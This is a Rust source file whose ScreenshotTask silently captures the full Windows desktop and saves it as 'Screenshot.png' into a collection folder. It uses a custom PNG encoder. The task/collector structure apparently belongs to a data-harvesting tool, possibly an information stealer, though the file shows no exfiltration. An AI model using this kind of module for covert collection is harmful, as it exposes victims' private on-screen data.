use crate::alloc::borrow::ToOwned;
use alloc::vec;
use alloc::vec::Vec;
use core::mem::zeroed;
use core::ptr::null_mut;
use miniz_oxide::deflate::compress_to_vec_zlib;
use tasks::{parent_name, Task};
use utils::path::{Path, WriteToFile};

use collector::Collector;
use utils::WideString;
use windows_sys::Win32::Graphics::Gdi::{BitBlt, CreateCompatibleBitmap, CreateCompatibleDC, CreateDCW, DeleteDC, DeleteObject, GetDIBits, SelectObject, BITMAPINFO, BITMAPINFOHEADER, BI_RGB, DIB_RGB_COLORS, SRCCOPY};
use windows_sys::Win32::UI::WindowsAndMessaging::{
    GetSystemMetrics, SM_CXVIRTUALSCREEN, SM_CYVIRTUALSCREEN,
    SM_XVIRTUALSCREEN, SM_YVIRTUALSCREEN,
};

pub(super) struct ScreenshotTask;

impl<C: Collector> Task<C> for ScreenshotTask {
    parent_name!("Screenshot.png");
    
    fn run(&self, parent: &Path, _: &C) {
        let Ok((width, height, pixels)) = capture_screen() else {
            return
        };
        
        let png = create_png(width as u32, height as u32, &pixels);
        let _ = png.write_to(parent);
    }
}

fn capture_screen() -> Result<(i32, i32, Vec<u8>), ()> {
    let (x, y, width, height) = unsafe {
        (GetSystemMetrics(SM_XVIRTUALSCREEN), GetSystemMetrics(SM_YVIRTUALSCREEN), 
         GetSystemMetrics(SM_CXVIRTUALSCREEN), GetSystemMetrics(SM_CYVIRTUALSCREEN))
    };

    let hdc = unsafe {
        CreateDCW(
            "DISPLAY".to_wide().as_ptr(),
            null_mut(),
            null_mut(),
            null_mut()
        )
    };

    let hdc_mem = unsafe { CreateCompatibleDC(hdc) };
    let hbitmap = unsafe { CreateCompatibleBitmap(hdc, width, height) };
    let _old = unsafe { SelectObject(hdc_mem, hbitmap as *mut _) };

    unsafe {
        BitBlt(hdc_mem, 0, 0, width, height, hdc, x, y, SRCCOPY);
    }

    let mut bmi: BITMAPINFO = unsafe { zeroed() };
    bmi.bmiHeader.biSize = size_of::<BITMAPINFOHEADER>() as _;
    bmi.bmiHeader.biWidth = width;
    bmi.bmiHeader.biHeight = -height;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    let mut pixels = vec![0u8; (width * height * 4) as usize];
    let result = unsafe {
        GetDIBits(
            hdc_mem,
            hbitmap,
            0,
            height as u32,
            pixels.as_mut_ptr() as *mut _,
            &mut bmi as *mut _ as *mut _,
            DIB_RGB_COLORS,
        )
    };
    
    unsafe {
        DeleteObject(hbitmap as *mut _);
        DeleteDC(hdc_mem);
    }

    if result == 0 {
        return Err(());
    }

    let rgb_pixels: Vec<u8> = pixels
        .chunks_exact(4)
        .flat_map(|p| [p[2], p[1], p[0]])
        .collect();

    Ok((width, height, rgb_pixels))
}

fn create_png(width: u32, height: u32, pixels: &[u8]) -> Vec<u8> {
    let mut png = Vec::new();

    png.extend(b"\x89PNG\r\n\x1A\n");

    let mut ihdr = Vec::new();
    ihdr.extend(width.to_be_bytes());
    ihdr.extend(height.to_be_bytes());
    ihdr.extend([8, 2, 0, 0, 0]);
    append_chunk(&mut png, b"IHDR", &ihdr);

    let scanlines: Vec<u8> = pixels
        .chunks((width * 3) as usize)
        .flat_map(|row| [0x00].into_iter().chain(row.iter().copied()))
        .collect();

    let compressed = compress_to_vec_zlib(&scanlines, 6);
    append_chunk(&mut png, b"IDAT", &compressed);

    append_chunk(&mut png, b"IEND", &[]);

    png
}

fn crc32(bytes: &[u8]) -> u32 {
    let mut table = [0u32; 256];

    for i in 0..256 {
        let mut c = i as u32;
        for _ in 0..8 {
            c = if c & 1 != 0 {
                0xEDB88320 ^ (c >> 1)
            } else {
                c >> 1
            };
        }
        table[i] = c;
    }

    let mut crc = 0xFFFFFFFFu32;
    for &b in bytes {
        crc = table[((crc ^ b as u32) & 0xFF) as usize] ^ (crc >> 8);
    }

    crc ^ 0xFFFFFFFF
}

fn append_chunk(png: &mut Vec<u8>, chunk_type: &[u8; 4], data: &[u8]) {
    let mut chunk_bytes = Vec::new();
    chunk_bytes.extend_from_slice(chunk_type);
    chunk_bytes.extend_from_slice(data);

    let crc = crc32(&chunk_bytes);

    png.extend(&(data.len() as u32).to_be_bytes());
    png.extend_from_slice(chunk_type);
    png.extend_from_slice(data);
    png.extend(&crc.to_be_bytes());
}